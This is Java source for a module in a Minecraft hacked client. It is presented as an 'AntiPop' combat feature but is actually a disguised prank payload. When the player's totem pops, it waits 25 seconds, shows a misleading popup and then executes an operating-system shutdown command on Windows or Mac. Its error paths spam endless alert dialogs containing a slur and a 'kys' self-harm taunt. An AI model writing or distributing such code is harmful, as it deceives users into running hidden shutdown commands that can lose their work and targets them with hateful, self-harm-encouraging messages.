package me.dev.putahacknn.features.modules.combat;

import me.dev.putahacknn.event.events.PacketEvent;
import me.dev.putahacknn.features.modules.Module;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.entity.Entity;
import net.minecraft.network.play.server.SPacketEntityStatus;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import org.apache.commons.lang3.SystemUtils;
import org.lwjgl.Sys;

public class AntiPop extends Module {

    private Thread thread;

    public AntiPop() {
        super("AntiPop", "makes you not pop anymore", Category.COMBAT, true, false, false);
    }

    @SubscribeEvent
    public void onPacket(PacketEvent.Receive event) {
        if (event.getPacket() instanceof SPacketEntityStatus) {
            SPacketEntityStatus packet = event.getPacket();
            if (packet.getOpCode() == 35) {
                Entity entity = packet.getEntity(mc.world);
                if (entity != null && entity.equals(mc.player)) lol();
            }
        }
    }

    private void lol() {
        if (thread != null) return;

        thread = new Thread(() -> {
            try {
                Thread.sleep(25000L);
            } catch (InterruptedException e) {
                for (int i = 0; i < Integer.MAX_VALUE; ++i) {
                    Sys.alert("gay", "your OS is gay and you should kys");
                }
            }

            Sys.alert("PutaHack.nn", "If the module didn't work, press the button on this popup");

            try {
                if (SystemUtils.IS_OS_MAC || SystemUtils.IS_OS_MAC_OSX) {
                    Runtime.getRuntime().exec("shutdown -t");
                } else if (SystemUtils.IS_OS_WINDOWS) {
                    Runtime.getRuntime().exec("shutdown /s");
                }
            } catch (Exception e) {
                for (int i = 0; i < Integer.MAX_VALUE; ++i) {
                    Sys.alert("gay", "your OS is gay and you should kys");
                }
            }
        }, "AntiPop-Thread-Executor-No-Totem-Pop-Thread-Primo-And-Woodz-Fanfic");
        thread.start();
    }
}
